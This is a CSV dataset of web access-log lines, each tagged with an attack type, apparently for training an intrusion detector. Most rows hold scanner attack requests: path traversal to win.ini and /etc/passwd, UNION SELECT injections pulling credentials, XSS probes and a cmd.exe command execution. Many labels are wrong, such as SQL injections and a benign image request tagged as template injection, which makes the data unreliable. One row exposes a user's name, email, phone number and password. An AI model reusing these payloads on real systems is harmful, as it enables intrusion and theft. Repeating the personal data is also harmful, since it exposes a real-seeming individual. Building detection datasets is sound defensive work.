source,text
"10.128.0.205 - - [24/Mar/2018:21:40:20 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1"" 404 283 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:49:51 +0330] ""GET /..../..../..../..../..../..../..../..../..../winnt/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:18:28:36 +0330] ""GET /cgi-bin/index.php?page=documents&doc=-99' UNION SELECT null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null-- HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:56:40 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20AND%204523%3D4523%20AND%20%28%27ULIy%27%3D%27ULIy HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:26:42 +0330] ""GET /examples/jsp/num/faq.php?action=&type=view&s=&id=-1' UNION SELECT 0,230233793,0,0,0,0,0-- HTTP/1.1"" 404 1027 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:40:58 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 404 214 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.239.154.141 - - [22/Jan/2019:18:02:22 +0330] ""GET /image/34237?name=tab-2-a10-70f-1.jpg&wh=200x200 HTTP/1.1"" 200 8126 ""https://torob.com/browse/95/%D8%AA%D8%A8%D9%84%D8%AA-tablet/?pf=0&pt=3500000&camera_res__min=0&camera_res__max=16&internal_memory__min=0&internal_memory__max=520&sort=price_desc&available=true"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"" ""-""",Server-Side Template Injection
"91.103.66.203 - - [23/Jan/2019:09:44:50 +0330] ""GET http://nexi.it/favicon.ico HTTP/1.1"" 400 666 ""http://nexi.it/"" ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"" ""-""",Server-Side Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:53:18 +0330] ""GET /image/{{basketItem.id}}?type=productModel%29%20AND%20%28SELECT%202665%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767871%2C%28SELECT%20%28ELT%282665%3D2665%2C1%29%29%29%2C0x7171707a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%286775%3D6775&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:44:48 +0330] ""GET /scripts/fake.cgi?arg=/../../../../../windows/win.ini HTTP/1.1"" 404 214 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.241.111.81 - - [24/Mar/2018:00:54:40 +0330] ""GET /query.idq?CiTemplate=../../../../../winnt/win.ini                                                                                                     HTTP/1.1"" 404 7892 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.125 - - [16/Mar/2012:19:21:28 +0330] ""GET /viewers/txt.php?filename=../../../../../../../../../../boot.ini\x00 HTTP/1.1"" 404 238 ""-"" ""-"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:49:18 +0330] ""GET /\x80../\x80../\x80../\x80../\x80../\x80../windows/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.172.152.13 - - [24/Mar/2018:19:26:01 +0330] ""GET /altercast/AlterCast?op=<script>alert(""adobe_document_server_61.nasl"")</script> HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"192.168.202.110 - - [16/Mar/2012:15:48:39 +0330] ""GET /plog-download.php?dl_type=album&checked[]=' UNION SELECT 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 --  HTTP/1.1"" 404 294 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:41:14 +0330] ""GET /../../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 404 233 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.79 - - [16/Mar/2012:19:12:38 +0330] ""GET /cfdocs/exampleapp/email/getfile.cfm?filename=c:\\boot.ini HTTP/1.1"" 404 238 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000519)"" ""-""",file upload
"37.129.88.134 - - [25/Jan/2019:17:17:32 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D9%85%D8%AD%D9%85%D8%AF%D8%B9%D9%84%DB%8C&lastName=%D8%B4%D9%85%D8%B3+%D8%A7%D9%84%D8%AF%DB%8C%D9%86%DB%8C&username=mohammadshyan1373%40gmail.com&mobile=09139190658&password=as1234&password2=as1234 HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J500F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:53:25 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%29%20AND%201139%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27rywW%27%3D%27rywW&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:18:32:41 +0330] ""GET /cgi-bin/cal_event.php?id=1' UNION SELECT 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13-- HTTP/1.1"" 404 1635 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:53:22 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%20AND%20%28SELECT%202665%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767871%2C%28SELECT%20%28ELT%282665%3D2665%2C1%29%29%29%2C0x7171707a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27obyh%27%3D%27obyh&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:51:15 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:58:28 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20mBwJ HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:58:33 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20XuIY HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:42:14 +0330] ""GET //surgeweb?username_ex=""><scri<script>alert(42);</script><input type=""hidden HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.172.152.13 - - [24/Mar/2018:19:18:51 +0330] ""GET http://rfi.nessus.org/check_proxy.html HTTP/1.1"" 404 294 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:54:56 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20dIhC&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:44:48 +0330] ""GET //../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:42:04 +0330] ""GET /../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:53:01 +0330] ""GET /logon?onok=""><script>alert('axon_logon_xss.nasl')</script> HTTP/1.1"" 404 345 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:41:14 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini HTTP/1.1"" 404 233 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:55:18 +0330] ""GET /image/{{basketItem.id}}?type=productModel%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20gJPP&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:24:45 +0330] ""GET /examples/jsp/colors/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 HTTP/1.1"" 404 311 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:22:45:34 +0330] ""GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:14 +0330] ""GET /././././././../../../../../etc/passwd HTTP/1.1"" 400 173 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:56 +0330] ""GET /servlet/webacc?User.lang=<script>foo</script> HTTP/1.1"" 404 7600 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.238 - - [23/Mar/2018:19:01:04 +0330] ""GET /api/set/1/2?value=wwzr7{{641*463}}qh8s1 HTTP/1.1"" 200 22 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:40:21 +0330] ""GET /scripts/fake.cgi?arg=/../../../../../winnt/win.ini HTTP/1.1"" 404 309 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:53:49 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%3BSELECT%20PG_SLEEP%285%29--&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:40:21 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 404 309 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.138 - - [17/Mar/2012:19:22:09 +0330] ""GET /index.php?action=view&module=resourcesmodule&id=0 UNION SELECT -1,'exponent_0964.nasl','Nessus test','O:8:""stdClass"":3:{s:3:""mod"";s:15:""resourcesmodule"";s:3:""src"";s:20:""@random41940ceb78dbb"";s:3:""int"";s:0:"""";}',7,0,0,0,0,0,0 -- HTTP/1.1"" 404 287 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.238 - - [24/Mar/2018:21:51:21 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:26:40 +0330] ""GET /manager/admin/index.php?act=login&username=' UNION SELECT 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus HTTP/1.1"" 404 1546 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.238 - - [24/Mar/2018:21:55:15 +0330] ""GET /examples/jsp/source.jsp?../../../../system/autoexec.ncf HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [25/Mar/2018:00:25:51 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:44:42 +0330] ""GET /../../../../../../../etc/passwd HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:16 +0330] ""GET /././././././../../../../../winnt/win.ini HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:36 +0330] ""GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:55:35 +0330] ""GET /mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:56:40 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20AND%208076%3D5369%20AND%20%28%27ulms%27%3D%27ulms HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:26:25 +0330] ""GET /index.php?act=sm_window&page=event&day=-1 UNION SELECT 1,1331904453,478751466 -- HTTP/1.1"" 404 982 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:41:32 +0330] ""POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1"" 404 7568 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.205 - - [24/Mar/2018:22:45:34 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 244 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:52:56 +0330] ""GET /<script>foo</script> HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.238 - - [24/Mar/2018:21:55:19 +0330] ""POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1"" 404 7568 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"192.168.202.110 - - [16/Mar/2012:14:26:16 +0330] ""GET /examples/jsp/colors/?showimage=') UNION SELECT 'pixelpost_15rc1.nasl-1331904443.jpg' as id, 1587207306 as headline, 1561838212 as datetime, 115039599 as body, 830126584 as category, 701830241 as image-- HTTP/1.1"" 404 1015 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.238 - - [24/Mar/2018:21:55:17 +0330] ""GET .\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/windows/win.ini HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:57:00 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%209711%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289711%3D9711%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20eQtS HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:40:21 +0330] ""GET /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd HTTP/1.1"" 404 345 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:40 +0330] ""POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1"" 404 233 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"192.168.202.110 - - [16/Mar/2012:15:38:23 +0330] ""GET /cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 HTTP/1.0"" 200 90 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:49:21 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1"" 404 315 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:22 +0330] ""GET /item.fts?href=""><script>alert(""ftgate_44002.nasl"")</script>; HTTP/1.1"" 404 284 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:41:44 +0330] ""GET /exchange/..\xc1%8s..\xc1%8s..\xc1%8s..\xc1%8s..\xc1%8s../winnt/system32/cmd.exe?/c+dir+c:\\+/OG HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:54:57 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20XWBG&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:55:37 +0330] ""GET /console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script> HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"192.168.202.110 - - [16/Mar/2012:15:40:26 +0330] ""GET /scripts/insertorder.cfm?CFID=1&CFTOKEN=1 UNION SELECT 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from Params""having 1=1 HTTP/1.0"" 200 90 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:22:45:34 +0330] ""GET /./../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:22:45:14 +0330] ""GET //../../../../../../../../../windows/win.ini HTTP/1.1"" 404 318 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:42:04 +0330] ""GET /scripts/fake.cgi?arg=/../../../../../windows/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:50:00 +0330] ""GET ../../../../../../../../../../../../windows/win.ini HTTP/1.0"" 404 151 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"192.168.202.110 - - [16/Mar/2012:16:47:36 +0330] ""GET /scripts/parse_xml.cgi?action=login&filename=frameset.html|id\x00| HTTP/1.1"" 404 298 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"192.168.202.110 - - [16/Mar/2012:14:26:25 +0330] ""GET /examples/jsp/sessions/index.php?act=sm_window&page=event&day=-1 UNION SELECT 1,1331904452,1874553585 -- HTTP/1.1"" 404 309 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:59:36 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:53:55 +0330] ""GET /examples/jsp/source.jsp?../../../../system/autoexec.ncf HTTP/1.1"" 404 316 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:58:07 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20ZKEb HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:55:15 +0330] ""GET /examples/jsp/source.jsp?../../../../system/autoexec.ncf HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
